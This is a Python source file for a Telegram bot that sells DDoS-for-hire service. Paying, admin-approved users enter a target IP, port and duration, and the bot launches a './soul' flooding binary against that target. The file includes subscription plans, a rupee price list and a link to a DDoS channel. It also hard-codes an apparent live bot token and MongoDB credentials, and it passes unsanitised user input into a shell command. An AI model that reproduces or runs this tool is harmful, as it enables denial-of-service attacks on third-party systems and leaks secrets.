import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread
import pytz

loop = asyncio.get_event_loop()

TOKEN = '7177256686:AAFt9NqlN6AFnoh4r7JK6vJ4nP0aHNga-sE'  # Updated Bot Token
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002172184452
CHANNEL_ID = -1002172184452
error_channel_id = -1002150195409

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

running_processes = []

REMOTE_HOST = '4.213.71.147'

async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./soul {target_ip} {target_port} {duration} 70"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    await run_attack_command_on_codespace(target_ip, target_port, duration)

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create a markup object
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    # Create buttons
    btn1 = KeyboardButton("Instant Plan 🧡")
    btn2 = KeyboardButton("Instant++ Plan 💥")
    btn3 = KeyboardButton("Canary Download✔️")
    btn4 = KeyboardButton("My Account🏦")
    btn5 = KeyboardButton("Help❓")
    btn6 = KeyboardButton("Contact admin✔️")

    # Add buttons to the markup
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)

    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    if message.text == "Instant Plan 🧡":
        bot.reply_to(message, "*Instant Plan 🧡: 5 Minutes for 500 IPs every 30 seconds*", parse_mode='Markdown')
    elif message.text == "Instant++ Plan 💥":
        bot.reply_to(message, "*Instant++ Plan 💥 selected. Please wait for the attack to start.*", parse_mode='Markdown')
        attack_command(message)
    elif message.text == "Canary Download✔️":
        bot.send_message(message.chat.id, "https://t.me/Danger_hack_ddos/19")
    elif message.text == "My Account🏦":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        tz = pytz.timezone('Asia/Kolkata')  # IST timezone
        current_time = datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")
        if user_data:
            username = message.from_user.username or 'N/A'
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            response = (f"*USERNAME: {username}\n"
                        f"USER ID: '{user_id}'\n"
                        f"PLAN: {plan}\n"
                        f"VALID UNTIL: {valid_until}\n"
                        f"CURRENT TIME: {current_time}*")
        else:
            response = "*No account information found. Please contact the administrator.*"
        bot.send_message(message.chat.id, response, parse_mode='Markdown')
    elif message.text == "Help❓":
        bot.send_message(message.chat.id, "*CONTACT ADMIN - @jks6190*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.send_message(message.chat.id, "*CONTACT ADMIN @jks6190 to buy the DDOS 😈\n\n"
                                            "PRICE LIST - \n"
                                            "1 DAY - ₹50\n"
                                            "3 DAY- ₹100\n"
                                            "7 DAY - ₹250\n"
                                            "1 MONTH - ₹600\n"
                                            "YOUR OWN BOT SETUP & PERMANENT SCRIPT - JUST ₹1000\n\n"
                                            "EK BAAR LE KE TO DEKHO...BAAR BAAR LOGE ....DDOS 😁*", parse_mode='Markdown')

if __name__ == '__main__':
    Thread(target=start_asyncio_thread).start()
    bot.polling()
	